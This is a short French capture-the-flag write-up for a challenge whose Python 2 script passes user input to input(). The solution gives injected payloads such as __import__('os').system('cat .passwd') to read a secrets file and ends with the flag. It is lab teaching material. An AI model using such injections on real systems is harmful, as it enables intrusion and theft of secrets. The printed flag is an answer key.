# Enoncé
Vous travaillez pour la DRSD (Direction du Renseignement et de la Sécurité de la Défense) en tant qu'agent secret. Vous devez si vous l'acceptez, récupérer l'information importante contenues dans le .passwd afin de savoir ce que trame le pays ennemi. Trouvez une vulnérabilité de ce script pour récupérer le flag.

Code du programme: https://jeuxpythiques.woody.sh/fichiers/Message.py

Auteur: ethangyg

nc jeuxpythiques.woody.sh 8007

# Solution
Le but est d'injecter une commande dans la fonction input, étant du Python2 la fonction input n'est pas sécurisé.
Première tentative : __import__('os').system('ls')
Deuxième tentative : __import__('os').system('ls -la')
Dernière tentative : __import__('os').system('cat .passwd')

# Flag
JP2023{Pyth0n24r30utd4t3d}